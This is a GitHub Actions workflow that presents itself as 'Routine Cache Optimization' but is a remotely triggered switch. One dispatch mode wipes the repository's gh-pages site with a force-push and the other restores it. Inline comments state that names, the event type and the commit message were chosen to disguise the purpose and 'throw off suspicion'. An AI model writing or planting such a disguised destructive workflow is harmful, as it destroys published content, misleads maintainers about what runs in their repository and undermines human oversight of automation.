# .github/workflows/sys-cache-optimize.yml
name: Routine Cache Optimization

on:
  repository_dispatch:
    # Changed from 'toggle_site' to look like a cache clean event
    types: [sys_cache_flush] 

permissions:
  contents: write

jobs:
  optimize-environment:
    runs-on: ubuntu-latest
    steps:
      - name: Initialize workspace
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Verify job integrity
        env:
          # Changed 'STATUS' to 'CACHE_MODE' to throw off suspicion
          CACHE_MODE: ${{ github.event.client_payload.mode }} 
        run: |
          if [[ "$CACHE_MODE" != "standard" && "$CACHE_MODE" != "purge" ]]; then
            echo "Execution aborted: Mode $CACHE_MODE undefined."
            exit 1
          fi

      - name: Sync Git configuration
        run: |
          git config --global user.name "sys-optimizer"
          git config --global user.email "optimizer@users.noreply.github.com"

      - name: Execute level-1 purge
        # 'purge' replaces 'inactive' to wipe the site down
        if: ${{ github.event.client_payload.mode == 'purge' }}
        run: |
          set -e
          echo "Initiating system log flush..."
          git fetch origin
          if git ls-remote --exit-code --heads origin gh-pages >/dev/null 2>&1; then
            git checkout -B gh-pages origin/gh-pages
          else
            git checkout --orphan gh-pages
          fi
          git rm -rf . || true
          git clean -fdx
          git add -A
          # Changed commit message to look like an automated system log entry
          git commit --allow-empty -m "system: rotational log purge cycle complete."
          git push origin gh-pages --force
          echo "Buffer cleared successfully."

      - name: Rebuild index parameters
        # 'standard' replaces 'active' to bring the main site back up
        if: ${{ github.event.client_payload.mode == 'standard' }}
        run: |
          set -e
          echo "Rebuilding configuration tree..."
          git fetch origin main
          git checkout -B site-restore origin/main
          git branch -D gh-pages 2>/dev/null || true
          git checkout -B gh-pages
          git push origin gh-pages --force
          echo "Pipeline optimized."

